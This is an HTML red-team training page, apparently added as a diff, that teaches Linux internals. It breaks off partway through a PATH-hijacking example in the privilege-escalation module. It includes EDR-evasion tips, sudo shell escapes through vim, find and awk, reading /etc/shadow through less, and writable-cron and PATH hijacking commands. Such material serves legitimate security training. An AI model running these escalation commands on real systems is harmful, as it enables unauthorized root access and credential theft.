@@ -1,0 +1,1291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux Internals for Red Teamers</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+:root { --bg: #050810; --panel: #0a1020; --accent: #00d4ff; --danger: #ff3366; --success: #00ff88; --warning: #ff8800; --purple: #bb86fc; --text: #c8d6e5; --dim: #536878; }
+html { scroll-behavior: smooth; }
+body { background: var(--bg); color: var(--text); font-family: 'Exo 2', sans-serif; font-size: 15px; line-height: 1.7; min-height: 100vh; overflow-x: hidden; }
+body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; background: repeating-linear-gradient(0deg, rgba(0,0,0,0.08) 0px, rgba(0,0,0,0.08) 1px, transparent 1px, transparent 3px); }
+h1, h2, h3, h4 { font-family: 'Rajdhani', sans-serif; font-weight: 700; letter-spacing: 1px; }
+h1 { font-size: 3.5rem; color: var(--accent); animation: glitch 3s infinite; position: relative; display: inline-block; }
+h1::before, h1::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; }
+h1::before { color: var(--danger); animation: glitch-top 3s infinite; clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%); }
+h1::after { color: var(--accent); animation: glitch-bottom 3s infinite; clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%); }
+@keyframes glitch { 2%, 64% { transform: skew(0); } 4%, 60% { transform: skew(2deg); } 62% { transform: skew(-3deg); } }
+@keyframes glitch-top { 2%, 64% { opacity: 0; } 4%, 60% { opacity: 1; } 62% { opacity: 0; } }
+@keyframes glitch-bottom { 2%, 64% { opacity: 0; } 4%, 60% { opacity: 1; transform: translate(2px, -1px); } 62% { opacity: 0; } }
+
+/* Sidebar */
+#sidebar { position: fixed; top: 0; left: 0; width: 240px; height: 100vh; background: var(--panel); border-right: 1px solid #1a1a2e; padding: 20px; overflow-y: auto; z-index: 100; display: flex; flex-direction: column; }
+#sidebar .logo { font-family: 'Share Tech Mono', monospace; font-size: 1.3rem; color: var(--accent); margin-bottom: 5px; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,212,255,0.3); }
+#sidebar .logo-sub { font-size: 0.7rem; color: var(--dim); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 3px; }
+.progress-wrap { background: #000; border-radius: 4px; height: 6px; margin-bottom: 5px; overflow: hidden; }
+.progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent), var(--success)); transition: width 0.5s ease; border-radius: 4px; }
+.progress-text { font-size: 0.75rem; color: var(--dim); margin-bottom: 20px; text-align: center; font-family: 'Share Tech Mono', monospace; }
+#sidebar nav { display: flex; flex-direction: column; gap: 2px; flex: 1; }
+#sidebar nav a { display: flex; align-items: center; gap: 10px; padding: 8px 10px; color: var(--dim); text-decoration: none; font-size: 0.8rem; border-radius: 4px; transition: all 0.2s; font-family: 'Rajdhani', sans-serif; letter-spacing: 0.5px; }
+#sidebar nav a:hover, #sidebar nav a.active { color: var(--accent); background: rgba(0,212,255,0.05); }
+#sidebar nav a .dot { width: 8px; height: 8px; border-radius: 50%; background: #1a1a2e; flex-shrink: 0; border: 1px solid #2a2a3e; transition: all 0.3s; }
+#sidebar nav a .dot.done { background: var(--success); border-color: var(--success); box-shadow: 0 0 6px rgba(0,255,136,0.4); }
+#sidebar nav a .num { color: var(--dim); font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; width: 16px; text-align: right; }
+
+/* Main */
+#main { margin-left: 240px; min-height: 100vh; }
+.hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 60px 40px; position: relative; overflow: hidden; }
+.hero::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; }
+.hero h1 { margin-bottom: 10px; }
+.hero .tagline { font-size: 1.1rem; color: var(--dim); margin-bottom: 30px; font-weight: 300; }
+.hero .stats { display: flex; gap: 30px; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem; color: var(--dim); }
+.hero .stats span { color: var(--accent); }
+.scroll-hint { position: absolute; bottom: 30px; color: var(--dim); font-size: 0.8rem; animation: bounce 2s infinite; }
+@keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+
+.content { padding: 40px; max-width: 1000px; margin: 0 auto; }
+
+/* Module Cards */
+.module { margin-bottom: 25px; }
+.module-header { display: flex; align-items: center; justify-content: space-between; padding: 18px 20px; background: var(--panel); border-left: 3px solid #1a1a2e; border-radius: 8px; cursor: pointer; transition: all 0.3s; user-select: none; }
+.module-header:hover, .module.open > .module-header { border-left-color: var(--accent); background: #0c1428; }
+.module-header h2 { font-size: 1.15rem; color: var(--text); margin: 0; }
+.module-header .num-badge { font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; color: var(--accent); background: rgba(0,212,255,0.1); padding: 2px 10px; border-radius: 10px; margin-right: 12px; }
+.module-header .chevron { color: var(--dim); transition: transform 0.3s; font-size: 0.9rem; }
+.module.open .chevron { transform: rotate(90deg); color: var(--accent); }
+.module-body { display: none; padding: 20px; background: rgba(10,16,32,0.5); border-radius: 0 0 8px 8px; border-left: 3px solid var(--accent); }
+.module.open .module-body { display: block; }
+
+/* Content Blocks */
+.ab { border-left: 3px solid #ff3366; background: #1a0a14; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.ib { border-left: 3px solid #00d4ff; background: #0a1420; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.lb { border-left: 3px solid #00ff88; background: #0a1a10; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.wb { border-left: 3px solid #ff8800; background: #1a1008; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.mm { border-left: 3px solid #bb86fc; background: #100a1a; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; font-style: italic; }
+.cb { background: #000; padding: 15px; margin: 10px 0; border-radius: 8px; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem; line-height: 1.6; }
+.cmd { color: #00d4ff; } .cmt { color: #666; } .flg { color: #ff8800; } .val { color: #00ff88; } .pth { color: #bb86fc; }
+.ascii { background: #000; padding: 15px; margin: 10px 0; border-radius: 8px; color: #00d4ff; font-family: 'Share Tech Mono', monospace; white-space: pre; font-size: 12px; line-height: 1.4; overflow-x: auto; }
+.dtable { width: 100%; border-collapse: collapse; margin: 10px 0; }
+.dtable th { background: #0a1020; color: #00d4ff; padding: 8px; border: 1px solid #1a1a2e; font-family: 'Rajdhani', sans-serif; font-size: 0.9rem; }
+.dtable td { padding: 8px; border: 1px solid #1a1a2e; font-size: 0.85rem; }
+.dtable td:first-child { color: #00d4ff; font-family: 'Share Tech Mono', monospace; }
+.cl-item { display: flex; align-items: center; gap: 10px; padding: 8px 12px; margin: 4px 0; background: #0a1020; border-radius: 6px; cursor: pointer; transition: all 0.2s; }
+.cl-item:hover { background: #101830; }
+.cl-item::before { content: '⬜'; font-size: 18px; flex-shrink: 0; }
+.cl-item.done::before { content: '✅'; }
+.cl-item.done { color: #00ff88; text-decoration: line-through; }
+
+.block-label { font-family: 'Rajdhani', sans-serif; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; opacity: 0.7; }
+.ab .block-label { color: #ff3366; }
+.ib .block-label { color: #00d4ff; }
+.lb .block-label { color: #00ff88; }
+.wb .block-label { color: #ff8800; }
+.mm .block-label { color: #bb86fc; }
+.module-body h3 { color: var(--accent); font-size: 1rem; margin: 15px 0 8px; }
+.module-body p { margin: 8px 0; }
+.module-body ul, .module-body ol { margin: 8px 0; padding-left: 20px; }
+.module-body li { margin: 4px 0; }
+
+.ab-title { font-family: 'Rajdhani', sans-serif; color: #ff3366; font-size: 0.95rem; font-weight: 600; margin-bottom: 6px; }
+.ib-title { font-family: 'Rajdhani', sans-serif; color: #00d4ff; font-size: 0.95rem; font-weight: 600; margin-bottom: 6px; }
+
+/* Checklist within module */
+.cl-section { margin: 12px 0; padding: 10px 0; border-top: 1px solid #1a1a2e; }
+.cl-title { font-family: 'Rajdhani', sans-serif; color: var(--success); font-size: 0.9rem; margin-bottom: 8px; letter-spacing: 1px; }
+
+/* Responsive */
+@media (max-width: 768px) {
+  #sidebar { width: 100%; height: auto; position: relative; border-right: none; border-bottom: 1px solid #1a1a2e; padding: 10px 15px; }
+  #sidebar nav { flex-direction: row; flex-wrap: wrap; gap: 0; }
+  #sidebar nav a { font-size: 0.7rem; padding: 4px 6px; }
+  #sidebar .logo { font-size: 1rem; }
+  #sidebar .logo-sub, .progress-wrap, .progress-text { display: none; }
+  #main { margin-left: 0; }
+  .content { padding: 20px 15px; }
+  .hero h1 { font-size: 2rem; }
+  .module-header h2 { font-size: 0.95rem; }
+}
+</style>
+</head>
+<body>
+
+<div id="sidebar">
+  <div class="logo">LINUX_INTERNALS</div>
+  <div class="logo-sub">Red Team Edition v1.0</div>
+  <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+  <div class="progress-text"><span id="progressCount">0/0</span> tasks</div>
+  <nav id="sideNav"></nav>
+</div>
+
+<div id="main">
+  <section class="hero">
+    <h1 data-text="LINUX INTERNALS">LINUX INTERNALS</h1>
+    <div class="tagline">for Red Team Operators</div>
+    <div class="stats">
+      <div>10 <span>Modules</span></div>
+      <div>50+ <span>Techniques</span></div>
+      <div>100% <span>Offensive</span></div>
+    </div>
+    <div class="scroll-hint">▼ SCROLL ▼</div>
+  </section>
+
+  <div class="content" id="modulesContainer"></div>
+</div>
+
+<script>
+const modules = [
+  {
+    id: 'm1', title: 'Linux Architecture Overview', num: '01',
+    content: `
+      <p>The Linux operating system is built around a monolithic kernel architecture that provides a fundamental separation between kernel space and user space. This boundary is the most critical security demarcation on any Linux system. Understanding this architecture from a red team perspective means understanding where the attack surfaces live, how to cross privilege boundaries, and where detection mechanisms reside.</p>
+
+      <h3>The Kernel and User Space Divide</h3>
+      <p>The kernel operates in the most privileged CPU ring (Ring 0 on x86), with unrestricted access to hardware, memory, and all running processes. User space applications run in Ring 3, with restricted access enforced by the CPU's protection rings. When a user space program needs to interact with hardware, allocate memory, or create processes, it must go through the kernel via system calls (syscalls).</p>
+
+      <div class="ascii">┌─────────────────────────────────────────────────────┐
+│                    USER SPACE (Ring 3)              │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐         │
+│  │  bash    │  │  nginx   │  │  sshd    │  ...     │
+│  └────┬─────┘  └────┬─────┘  └────┬─────┘         │
+│       │              │              │               │
+│  ┌────▼──────────────▼──────────────▼─────┐        │
+│  │          libc (glibc/musl)             │        │
+│  └────────────────┬───────────────────────┘        │
+├───────────────────┼───────────────────────────────┤
+│  ┌────────────────▼───────────────────────┐        │
+│  │         SYSCALL INTERFACE              │        │
+│  │  (int 0x80 / sysenter / syscall)       │        │
+│  └────────────────┬───────────────────────┘        │
+│                   │  KERNEL SPACE (Ring 0)         │
+│  ┌────────────────▼───────────────────────┐        │
+│  │       VFS / Scheduler / MM / Net       │        │
+│  └────────────────┬───────────────────────┘        │
+│  ┌────────────────▼───────────────────────┐        │
+│  │         Device Drivers                  │        │
+│  └────────────────┬───────────────────────┘        │
+├───────────────────┼───────────────────────────────┤
+│             HARDWARE (Ring 0 - Hypervisor)         │
+└───────────────────┴───────────────────────────────┘</div>
+
+      <h3>System Calls</h3>
+      <p>Syscalls are the only legitimate way for user space to request kernel services. On x86_64 Linux, the <span class="cmd">syscall</span> instruction is used with the syscall number in <span class="cmd">rax</span> and arguments in <span class="cmd">rdi</span>, <span class="cmd">rsi</span>, <span class="cmd">rdx</span>, <span class="cmd">r10</span>, <span class="cmd">r8</span>, <span class="cmd">r9</span>. Common syscalls include <span class="cmd">read</span> (0), <span class="cmd">write</span> (1), <span class="cmd">open</span> (2), <span class="cmd">close</span> (3), <span class="cmd">mmap</span> (9), <span class="cmd">clone</span> (56), and <span class="cmd">execve</span> (59). From a red team perspective, syscalls are interesting because many EDR solutions hook libc functions rather than the syscall interface itself. Direct syscalls can bypass userland hooks entirely.</p>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Direct Syscall Evasion:</b> By invoking syscalls directly via assembly or using tools like SysWhispers, an attacker can bypass libc hooks placed by security products. Tools such as <span class="cmd">pwnkit</span> (CVE-2021-4034) exploited a bug in <span class="cmd">pkexec</span>, a setuid binary that interacted with the system via the polkit framework, demonstrating how understanding the architecture at the syscall level leads to privilege escalation.
+      </div>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        The current syscall table can be viewed at <span class="pth">/usr/include/asm/unistd_64.h</span>. On a default system, there are approximately 450 syscalls available, though only a subset are commonly used.
+      </div>
+
+      <h3>The /proc Filesystem</h3>
+      <p>The <span class="pth">/proc</span> filesystem is a pseudo-filesystem that exposes kernel data structures to user space. Each running process has a directory at <span class="pth">/proc/[pid]/</span> containing critical information: <span class="cmd">maps</span> shows memory mappings, <span class="cmd">cmdline</span> shows the full command line, <span class="cmd">environ</span> shows environment variables (potential secrets), <span class="cmd">fd/</span> contains open file descriptors, and <span class="cmd">status</span> shows process state and credentials. The <span class="pth">/proc/[pid]/mem</span> file, when readable, allows direct read/write to process memory — a powerful primitive for credential dumping or code injection.</p>
+
+      <div class="wb">
+        <div class="block-label">Warning</div>
+        Modern Linux kernels have <span class="cmd">ptrace_may_access</span> checks on <span class="pth">/proc/[pid]/mem</span>. The <span class="cmd">CONFIG_STRICT_DEVMEM</span> kernel option also restricts direct access to physical memory via <span class="pth">/dev/mem</span>. Always verify your kernel configuration before relying on these vectors.
+      </div>
+
+      <h3>Kernel Attack Surface Summary</h3>
+      <table class="dtable">
+        <tr><th>Attack Surface</th><th>Location</th><th>Risk Level</th></tr>
+        <tr><td>Syscalls</td><td>int 0x80 / syscall instruction</td><td>High</td></tr>
+        <tr><td>Setuid Binaries</td><td>/usr/bin/* (setuid bit)</td><td>Medium</td></tr>
+        <tr><td>procfs</td><td>/proc/[pid]/*</td><td>Medium</td></tr>
+        <tr><td>sysfs</td><td>/sys/*</td><td>Low</td></tr>
+        <tr><td>Kernel Modules</td><td>/lib/modules/*</td><td>High</td></tr>
+        <tr><td>ioctl</td><td>Device drivers</td><td>Variable</td></tr>
+      </table>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Think of the kernel as a hotel manager. Every request from a guest (user space) must go through the front desk (syscall interface). The manager has master keys (root privileges) and can enter any room. Security products are like security cameras in the lobby (libc hooks). Direct syscalls are like using the service elevator — you bypass the lobby cameras entirely.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Explore the syscall interface on a Linux VM.<br>
+        <b>1.</b> Run <span class="cmd">cat /proc/kallsyms | head -20</span> to view kernel symbols.<br>
+        <b>2.</b> Write a minimal C program that calls <span class="cmd">write()</span> directly via syscall: <span class="cmd">syscall(SYS_write, 1, "hello\\n", 6);</span><br>
+        <b>3.</b> Compare the strace output of a normal write vs. a direct syscall.<br>
+        <b>4.</b> Examine <span class="cmd">/proc/self/maps</span> to see library mappings.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Understand the kernel/user space boundary</div>
+        <div class="cl-item">Know how syscalls work and how to invoke them directly</div>
+        <div class="cl-item">Explore /proc for process reconnaissance</div>
+        <div class="cl-item">Understand setuid and its security implications</div>
+      </div>
+    `
+  },
+  {
+    id: 'm2', title: 'Linux File System and Permissions', num: '02',
+    content: `
+      <p>The Linux filesystem is a hierarchical tree rooted at <span class="pth">/</span>, but what makes it unique from a red team perspective is the discretionary access control (DAC) model. Every file and directory has an owner, a group, and a set of permissions that govern who can read, write, or execute it. Understanding and manipulating these permissions is fundamental to privilege escalation, persistence, and lateral movement.</p>
+
+      <h3>The Standard Permission Model</h3>
+      <p>Each file has three permission triads: owner (user), group, and others. The permissions are read (r=4), write (w=2), and execute (x=1). They are typically displayed as a 10-character string: the first character indicates the file type (<span class="cmd">-</span> for regular file, <span class="cmd">d</span> for directory, <span class="cmd">l</span> for symlink), followed by three triads. A file with permissions <span class="cmd">-rwxr-xr-x</span> means the owner can read, write, and execute; the group and others can only read and execute.</p>
+
+      <div class="ascii">File Permission Breakdown:
+┌─ File Type (-=file, d=dir, l=link)
+│ ┌─── Owner (User)
+│ │ ┌─── Group
+│ │ │ ┌─── Others (World)
+│ │ │ │
+-rwxr-xr-x
+│││ │││ │││
+│││ │││ │└┴┴─ r=4, w=2, x=1
+│││ ││└────── Execute (1)
+│││ │└─────── Write  (2)
+│││ └──────── Read   (4)
+││└────────── Execute (1)
+│└─────────── Write  (2)
+└──────────── Read   (4)
+
+Numeric: 755 = rwxr-xr-x
+         r+w+x = 4+2+1 = 7 (owner)
+         r-+x = 4+0+1 = 5 (group)
+         r-+x = 4+0+1 = 5 (others)</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Permission Misconfiguration:</b> One of the most common privilege escalation vectors is finding files with misconfigured permissions. A script owned by root but writable by the user (<span class="cmd">-rwxrwxrwx</span>) is an instant privilege escalation vector if that script is executed by a cron job or a privileged service. Tools like <span class="cmd">linpeas.sh</span> and <span class="cmd">LinEnum</span> automate the search for these misconfigurations.
+      </div>
+
+      <h3>Special Permissions: SUID, SGID, and the Sticky Bit</h3>
+      <p>The SUID (Set User ID) bit, represented as <span class="cmd">s</span> in the owner's execute position, allows a binary to run with the privileges of its file owner rather than the user who executed it. This is the mechanism behind <span class="cmd">sudo</span>, <span class="cmd">passwd</span>, and <span class="cmd">ping</span>. SGID works similarly for the group. The sticky bit (<span class="cmd">t</span> in the others' execute position) on directories like <span class="pth">/tmp</span> prevents users from deleting each other's files.</p>
+
+      <div class="cb"><span class="cmt"># Find all SUID binaries on the system</span>
+find / -perm -4000 -type f 2>/dev/null
+
+<span class="cmt"># Find all SGID binaries</span>
+find / -perm -2000 -type f 2>/dev/null
+
+<span class="cmt"># Find world-writable files owned by root</span>
+find / -user root -perm -o+w -type f 2>/dev/null
+
+<span class="cmt"># Check a specific binary's permissions</span>
+ls -la /usr/bin/passwd
+<span class="flg">-rwsr-xr-x</span> 1 root root 59976 <span class="flg">...</span> /usr/bin/passwd</div>
+
+      <div class="wb">
+        <div class="block-label">Warning</div>
+        Many organizations scan for SUID binaries as part of their hardening process. However, SUID can also be set on shell scripts (though most modern kernels ignore the SUID bit on interpreted scripts for security reasons). Additionally, capabilities (covered later) are replacing SUID in modern Linux, but SUID is still widely deployed and exploitable.
+      </div>
+
+      <h3>Filesystem Hierarchy and Red Team Implications</h3>
+      <p>Understanding the standard Linux filesystem hierarchy helps during the reconnaissance phase. Key directories include <span class="pth">/etc</span> (configuration files), <span class="pth">/var/log</span> (log files), <span class="pth">/tmp</span> and <span class="pth">/dev/shm</span> (world-writable directories often used for temporary file storage during exploitation), <span class="pth">/home</span> (user data), and <span class="pth">/root</span> (root user's home). The <span class="pth">/dev/shm</span> directory is particularly interesting because it resides in RAM (tmpfs), making it a good place to store tools that you want to disappear on reboot.</p>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        The <span class="cmd">ls -la</span> output shows extended attributes. The <span class="flg">+</span> sign at the end of permissions indicates extended ACLs (<span class="cmd">getfacl</span> to view), and the <span class="flg">.</span> indicates SELinux context is present. On systems with SELinux, permission bypass via DAC is often blocked by MAC (Mandatory Access Control) policies.
+      </div>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Linux permissions are like a building with three access levels: owner (building manager), group (floor staff), and others (visitors). SUID is like giving a visitor a master key card that only works for a specific task. The sticky bit is like a public bulletin board where anyone can pin a note but only the original author can remove it.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Identify and exploit a permission misconfiguration.<br>
+        <b>1.</b> Create a file as root with <span class="cmd">sudo touch /testfile; sudo chmod 777 /testfile</span><br>
+        <b>2.</b> As a normal user, write to and execute that file.<br>
+        <b>3.</b> Find all SUID binaries and identify which ones are potentially dangerous (<span class="cmd">nmap</span>, <span class="cmd">vim</span>, <span class="cmd">find</span>, <span class="cmd">bash</span>).<br>
+        <b>4.</b> Practice using <span class="cmd">chmod</span> to set SUID: <span class="cmd">chmod u+s filename</span>.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Understand rwx permission triads and numeric notation</div>
+        <div class="cl-item">Identify and exploit SUID/SGID binaries</div>
+        <div class="cl-item">Leverage world-writable files and directories</div>
+        <div class="cl-item">Know the filesystem hierarchy for recon</div>
+      </div>
+    `
+  },
+  {
+    id: 'm3', title: 'Linux Processes', num: '03',
+    content: `
+      <p>Processes are the fundamental unit of execution in Linux. Each process is an isolated execution context with its own virtual address space, file descriptors, and credentials. From a red team perspective, understanding the lifecycle of processes, how they are created and destroyed, and how their credentials are managed is essential for privilege escalation, process injection, and evasion techniques.</p>
+
+      <h3>Process Creation: fork() and execve()</h3>
+      <p>The primary mechanism for creating new processes involves a combination of <span class="cmd">fork()</span> and <span class="cmd">execve()</span>. <span class="cmd">fork()</span> creates an exact copy of the calling process — the child process inherits the parent's memory mappings (using copy-on-write), file descriptors, signal handlers, and environment. The child then typically calls <span class="cmd">execve()</span> to replace its entire address space with a new program. The <span class="cmd">clone()</span> syscall is a more flexible version that underpins both <span class="cmd">fork()</span> and thread creation via <span class="cmd">pthread_create()</span>.</p>
+
+      <div class="ascii">        ┌─────────────┐
+        │    bash     │  PID=1000 PPID=999
+        └──────┬──────┘
+               │ fork()
+               ▼
+        ┌─────────────┐
+        │    bash     │  PID=1001 PPID=1000 (child, copy of parent)
+        └──────┬──────┘
+               │ execve("/bin/ls")
+               ▼
+        ┌─────────────┐
+        │     ls      │  PID=1001 PPID=1000 (new program, same PID)
+        └─────────────┘
+
+fork() → returns PID of child to parent, 0 to child
+execve() → replaces process image, does not return on success
+wait() → parent collects child exit status</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Process Injection</b> techniques often exploit the relationship between parent and child processes, or the shared memory via <span class="cmd">fork()</span>. The <span class="cmd">ptrace()</span> syscall allows a process to observe and control another (like a debugger), which can be abused to inject code into running processes. Additionally, <span class="cmd">LD_PRELOAD</span> (covered in Module 8) can inject shared libraries into newly <span class="cmd">execve()</span>'d processes.
+      </div>
+
+      <h3>Process Credentials</h3>
+      <p>Each process has several credential-related identifiers: real UID (RUID), effective UID (EUID), saved set-user-ID (SUID), filesystem UID (FSUID), and supplementary group IDs. The effective UID determines what permissions the process has for access control decisions. When a SUID binary is executed, the EUID becomes the owner of the file (typically root), while the RUID remains the original user. The saved set-user-ID allows the process to temporarily drop and regain privileges via <span class="cmd">seteuid()</span>.</p>
+
+      <div class="cb"><span class="cmt"># View process credentials</span>
+<span class="cmd">ps</span> aux
+<span class="cmd">cat</span> /proc/$$/status | grep -E <span class="flg">"(Uid|Gid|Name)"</span>
+
+<span class="cmt"># Real-time process monitoring</span>
+<span class="cmd">top</span> -bn1 | head -20
+
+<span class="cmt"># Tree view of process hierarchy</span>
+<span class="cmd">pstree</span> -p
+
+<span class="cmt"># Process ancestry</span>
+<span class="cmd">cat</span> /proc/$$/status | grep <span class="flg">"PPid"</span></div>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        The process file descriptor directory (<span class="pth">/proc/[pid]/fd/</span>) lists all open file descriptors as symbolic links. If a process has an open file descriptor to a sensitive file (like <span class="pth">/etc/shadow</span>), and you have ptrace access to that process, you can read the file through <span class="pth">/proc/[pid]/fd/N</span> even without direct read permissions.
+      </div>
+
+      <h3>Process States and Signals</h3>
+      <p>Processes transition through states: Running (R), Sleeping (S), Uninterruptible Sleep (D), Stopped (T), Zombie (Z), and Dead (X). Signals are used for inter-process communication and management. The <span class="cmd">kill</span> command sends signals — <span class="cmd">SIGTERM</span> (15) requests termination, <span class="cmd">SIGKILL</span> (9) forces it, <span class="cmd">SIGSTOP</span> (19) pauses a process. From a red team perspective, signal handling can be used for process manipulation and anti-debugging.</p>
+
+      <table class="dtable">
+        <tr><th>Signal</th><th>Value</th><th>Default Action</th><th>Red Team Use</th></tr>
+        <tr><td>SIGTERM</td><td>15</td><td>Terminate</td><td>Clean process killing</td></tr>
+        <tr><td>SIGKILL</td><td>9</td><td>Terminate (cannot be caught)</td><td>Forced termination</td></tr>
+        <tr><td>SIGSTOP</td><td>19</td><td>Stop (cannot be caught)</td><td>Process suspension</td></tr>
+        <tr><td>SIGTRAP</td><td>5</td><td>Core dump</td><td>Anti-debugging triggers</td></tr>
+        <tr><td>SIGCHLD</td><td>17</td><td>Ignore</td><td>Child exit notification</td></tr>
+      </table>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Think of <span class="cmd">fork()</span> as a photocopier — you get an identical copy. <span class="cmd">execve()</span> is like shredding that copy and writing a completely new document on the same page. The PID is like an employee ID badge that stays with the person even after they change roles. Process credentials are like different keycards: RUID is your ID card, EUID is the keycard you're currently using.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Understand process creation and management.<br>
+        <b>1.</b> Run <span class="cmd">strace -f bash -c "ls"</span> to see the fork/exec sequence.<br>
+        <b>2.</b> Write a C program that forks and has the child exec a different binary.<br>
+        <b>3.</b> Monitor process creation with <span class="cmd">auditctl -a exit,always -S fork -S execve</span>.<br>
+        <b>4.</b> Examine <span class="cmd">/proc/[pid]/status</span> for credential fields.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Understand fork()/execve() process creation</div>
+        <div class="cl-item">Know how process credentials work (RUID, EUID, SUID)</div>
+        <div class="cl-item">Use /proc/[pid] for process reconnaissance</div>
+        <div class="cl-item">Understand signals for process control</div>
+      </div>
+    `
+  },
+  {
+    id: 'm4', title: 'Linux Privilege Escalation Vectors', num: '04',
+    content: `
+      <p>Privilege escalation is the art of moving from a lower-privileged position (typically a standard user or www-data) to a higher-privileged one (typically root). Linux offers a rich attack surface for privilege escalation, from misconfigured SUID binaries to kernel exploits. This module covers the most common and reliable techniques used by red team operators.</p>
+
+      <h3>Sudo Abuse</h3>
+      <p>The <span class="cmd">sudo</span> command allows authorized users to execute commands as another user (typically root). The authorization rules are defined in <span class="pth">/etc/sudoers</span> and the <span class="pth">/etc/sudoers.d/</span> directory. The command <span class="cmd">sudo -l</span> lists what commands a user can run as sudo. Common misconfigurations include allowing sudo access to binaries that can be used to shell out or read arbitrary files.</p>
+
+      <div class="cb"><span class="cmt"># Check sudo privileges</span>
+<span class="cmd">sudo</span> -l
+
+<span class="cmt"># Common sudo escape techniques:</span>
+<span class="cmt"># If you can run vim as sudo:</span>
+<span class="cmd">sudo</span> vim -c <span class="flg">'!bash'</span>
+
+<span class="cmt"># If you can run less as sudo:</span>
+<span class="cmd">sudo</span> less /etc/shadow
+<span class="cmt"># Then type !bash within less</span>
+
+<span class="cmt"># If you can run find:</span>
+<span class="cmd">sudo</span> find . -exec /bin/sh \\; -quit
+
+<span class="cmt"># If you can run awk:</span>
+<span class="cmd">sudo</span> awk <span class="flg">'BEGIN {system("/bin/sh")}'</span></div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>GTFOBins:</b> The GTFOBins project (<span class="cmd">gtfobins.github.io</span>) catalogs Unix binaries that can be abused to bypass local security restrictions. This is the go-to reference when you identify a binary you can run via sudo. Always check GTFOBins when you find non-standard sudo entries.
+      </div>
+
+      <h3>Cron Job Exploitation</h3>
+      <p>Cron jobs are scheduled tasks that run at specified intervals. They are defined in system crontabs (<span class="pth">/etc/crontab</span>, <span class="pth">/etc/cron.d/*</span>) and user crontabs (managed via <span class="cmd">crontab -e</span>). If a cron job runs a script that is writable by your user, you can modify that script to execute arbitrary code as the cron job's user (often root). Cron jobs with wildcards in commands are also exploitable — the <span class="cmd">tar</span> wildcard argument injection is a classic example.</p>
+
+      <div class="cb"><span class="cmt"># Check cron jobs</span>
+<span class="cmd">ls</span> -la /etc/cron*
+<span class="cmd">cat</span> /etc/crontab
+<span class="cmd">cat</span> /etc/cron.d/*
+
+<span class="cmt"># Check for writable cron scripts</span>
+<span class="cmd">find</span> /etc/cron* -writable -type f 2>/dev/null
+
+<span class="cmt"># Monitor cron job execution</span>
+<span class="cmd">grep</span> CRON /var/log/syslog</div>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        The <span class="cmd">systemd</span> timer system is replacing traditional cron on many modern Linux distributions. Check <span class="cmd">systemctl list-timers --all</span> to view systemd timers. They can be equally exploitable if the triggered services write to user-writable locations.
+      </div>
+
+      <h3>PATH Hijacking</h3>
+      <p>PATH hijacking exploits the order in which the shell searches for executables. When a setuid binary or cron job calls another program without specifying the full path (e.g., calling <span class="cmd">cp</span> instead of <span class="cmd">/bin/cp</span>), an attacker can create a malicious executable with the same name in a directory that appears earlier in the PATH. The <span class="cmd">$PATH</span> environment variable controls this search order, and if you can modify it for a privileged context, you win.</p>
+
+      <div class="cb"><span class="cmt"># Check current PATH</span>
+<span class="cmd">echo</span> $PATH
+
+<span class="cmt"># Exploit: If a SUID binary runs "ps" without full path</span>
+<span class="cmd">echo</span> <span class="flg">'/bin/bash'</span> > /tmp/ps
